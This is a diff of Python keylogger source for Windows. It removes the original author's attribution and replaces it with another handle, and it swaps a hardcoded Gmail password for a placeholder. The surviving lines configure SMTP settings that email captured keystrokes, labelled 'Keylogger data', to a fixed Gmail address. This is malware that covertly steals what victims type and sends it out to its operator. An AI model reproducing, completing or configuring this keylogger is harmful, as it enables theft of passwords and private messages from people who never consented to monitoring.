@@ -1,9 +1,7 @@
 '''
-Xenotix Python Keylogger for Windows
+Python Keylogger for Windows
 ====================================
-Coded By: Ajin Abraham <ajin25@gmail.com>
-Website: http://opensecurity.in/xenotix-python-keylogger-for-windows/
-GitHub: https://github.com/ajinabraham/Xenotix-Python-Keylogger
+Coded By: Z4 YIIMBST
 
 FEATURES
 ========
@@ -125,7 +123,7 @@ class TimerClass(threading.Thread):
                 SERVER = "smtp.gmail.com" #Specify Server Here
                 PORT = 587 #Specify Port Here
                 USER="zidutest4@gmail.com"#Specify Username Here 
-                PASS="test@098765"#Specify Password Here
+                PASS="PAssword HERE"#Specify Password Here
                 FROM = USER#From address is taken from username
                 TO = ["zidutest4@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                 SUBJECT = "Keylogger data: "+str(ts)
